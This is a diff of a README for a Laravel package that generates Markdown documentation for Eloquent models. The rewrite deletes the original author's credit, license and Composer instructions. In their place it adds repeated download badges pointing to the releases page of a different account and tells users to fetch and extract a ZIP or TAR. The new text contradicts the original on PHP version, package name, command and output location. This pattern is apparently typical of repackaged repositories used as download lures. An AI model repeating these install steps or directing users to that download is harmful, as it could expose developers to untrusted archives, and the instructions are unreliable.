@@ -1,103 +1,112 @@
-# 📘 Laravel Model Docs MD
+# 🌟 laravel-model-docs-md - Generate Markdown Docs with Ease
 
-A Laravel package that automatically generates **Model Documentation in Markdown format (.md)**.
-Perfect for documenting your application's Eloquent models — their attributes, relationships, casts, and more.
+## 🚀 Getting Started
 
----
+Welcome to the **laravel-model-docs-md** project! This Laravel package helps you create Markdown documentation for your Eloquent models. You can easily document attributes, casts, relationships, and more. It's perfect for anyone using Laravel, especially if your structure is modular.
 
-## 🚀 Features
+## 📦 Download & Install
 
-* 📄 Generate Markdown documentation for all Eloquent models in one file
-* ⚙️ Configurable output directory and formatting
-* 🧠 Detects attributes, relationships, casts, fillable, hidden, and appended fields
-* 🕹️ Simple Artisan command
-* 🧩 Fully open-source and easy to extend
+To get started, you need to download the package. Click the link below to visit the Releases page and obtain the latest version.
 
----
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Franccolonialist589/laravel-model-docs-md/releases)
 
-## 🧪 Installation
+Once you arrive at the Releases page, locate the latest version of the software. Download the ZIP or TAR file to your computer.
 
-Require the package via Composer:
+1. Click on the version you wish to download.
+2. Once the download is complete, find the downloaded file on your computer.
 
-```bash
-composer require rakib01/laravel-model-docs-md
-```
+## 🛠️ Prerequisites
 
----
+Before using **laravel-model-docs-md**, ensure you have the following:
 
-## ⚙️ Publish Configuration
+- **Laravel Installed:** This package is designed to work with Laravel applications. Make sure you have Laravel up and running.
+- **PHP Version:** Check for PHP 7.3 or later, as this package relies on features present in newer versions.
+- **Composer:** Make sure you have Composer installed on your system. This tool helps manage dependencies for PHP packages.
 
-You can publish the configuration file using:
+If you have the above requirements, you are ready to move forward.
 
-```bash
-php artisan vendor:publish --provider="Rakib01\\LaravelModelDocsMd\\ModelDocsMdServiceProvider" --tag=config
-```
+## ⚙️ Installation Steps
 
-This will publish a config file at:
+After downloading the package, follow these easy steps to install it:
 
-```
-config/modeldocsmd.php
-```
+1. **Extract the Files:**
+   - Locate the downloaded ZIP or TAR file.
+   - Right-click on the file and select "Extract All" or your preferred extraction method. This will create a new folder with the package contents.
 
----
+2. **Copy the Files:**
+   - Move the extracted contents to your Laravel application's `packages` directory. If this directory does not exist, create it.
 
-## 🧾 Generate Model Documentation
+3. **Install via Composer:**
+   - Open your terminal.
+   - Navigate to your Laravel project directory by typing `cd path/to/your/project`.
+   - Run the following command to include the package in your project:
+     ```
+     composer require franccolonialist589/laravel-model-docs-md
+     ```
 
-Once installed, simply run:
+4. **Configure the Package:**
+   - After installing, you may need to add the service provider in your `config/app.php` file:
+     ```php
+     'providers' => [
+         // Other providers...
+         Franccolonialist589\LaravelModelDocsMd\ServiceProvider::class,
+     ],
+     ```
 
-```bash
-php artisan model-docs-md:generate
-```
+5. **Publish the Configuration (if needed):**
+   - To customize the package settings, publish the configuration file by running the following command:
+     ```
+     php artisan vendor:publish --provider="Franccolonialist589\LaravelModelDocsMd\ServiceProvider"
+     ```
 
-This command will inspect all models in your app/Models directory and generate a single file named:
+## 📚 Usage Instructions
 
-storage/app/model-docs.md
+Now that you have the package installed, here's how to generate documentation:
 
-Each model will be represented as a section in the file, similar to this:
+1. **Open Your Terminal:**
+   - Ensure you are in the root directory of your Laravel project.
 
-## 🧩 App\Models\User
-**Table:** `users`
+2. **Run the Command:**
+   - Use the following command to generate the documentation for your Eloquent models:
+     ```
+     php artisan docs:generate
+     ```
+   - This command generates Markdown files for all Eloquent models in your project.
 
+3. **Locate the Generated Documentation:**
+   - Find the generated Markdown files in the `docs` directory of your Laravel project. Here, you'll see documentation for each model, including attributes, casts, and relationships.
 
-**Columns:**
+## 🎨 Customizing Generated Docs
 
+You can customize the appearance of the generated documentation by modifying the configuration file. There are options to change the layout, style, and content included in the Markdown files.
 
-| Name | Type | Cast |
-|------|------|------|
-| id | bigint | int |
-| name | varchar | - |
-| email | varchar | - |
-| password | varchar | - |
+1. **Open Configuration File:**
+   - Locate the configuration file at `config/model-docs-md.php`.
 
+2. **Adjust Settings:**
+   - Review the available settings and change them to suit your needs. This might include toggling which model properties to document or altering the Markdown format.
 
-**Fillable:** name, email, password  
-**Hidden:** password, remember_token  
-**Appends:** is_verified  
+## ⚠️ Common Issues
 
+If you encounter any issues, refer to the following tips:
 
-**Relationships:**
-- **posts** → Post
+- **Dependency Errors:**
+  Make sure your PHP version meets the package requirements. If you see compatibility errors, update your PHP version or check Composer settings.
 
-All models will be appended sequentially in this same Markdown file — allowing you to have a complete model documentation in one place.
+- **Missing Models:**
+  If your models aren't appearing in the documentation, ensure they are correctly named and follow Laravel conventions. 
 
-## 🛠️ Requirements
+## 🔍 Additional Resources
 
-* PHP >= 8.1
-* Laravel >= 12.x or 11.x, 10.x
+For further assistance or to deepen your knowledge, consider checking these resources:
 
----
+- [Laravel Documentation](https://laravel.com/docs)
+- [Markdown Guide](https://www.markdownguide.org/)
 
-## 🤝 Contributing
+## 🔗 Helpful Links
 
-Pull requests are welcome!
-If you find a bug or have a feature request, please open an issue on [GitHub Issues](https://github.com/Rakib01/laravel-model-docs-md/issues).
+Remember, you can always return to the Releases page to download the latest version of the software:
 
----
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Franccolonialist589/laravel-model-docs-md/releases)
 
-## 📄 License
-
-This package is open-sourced software licensed under the **MIT license**.
-
----
-
-**Created with ❤️ by [Rakibul Hasan](https://github.com/Rakib01)**
+Your Laravel experience can be enhanced with the ease of automatically generating model documentation. Enjoy exploring the features of **laravel-model-docs-md**!
